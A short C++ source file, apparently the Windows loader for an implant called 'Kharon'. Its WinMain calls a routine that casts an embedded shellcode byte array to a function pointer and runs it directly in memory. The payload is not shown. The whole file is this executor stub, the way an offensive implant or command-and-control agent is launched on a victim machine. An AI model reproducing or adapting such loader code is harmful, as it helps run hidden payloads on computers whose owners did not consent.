#include <Kharon.h>
#include <Shellcode.h>

auto Runner( VOID ) -> VOID {
    VOID ( *Kharon )( VOID ) = ( decltype( Kharon ) )Shellcode::Data;
    Kharon();
}

auto WINAPI WinMain(
    _In_ HINSTANCE Instance,
    _In_ HINSTANCE PrevInstance,
    _In_ CHAR*     CommandLine,
    _In_ INT32     ShowCmd
) -> INT32 {
    Runner();
}
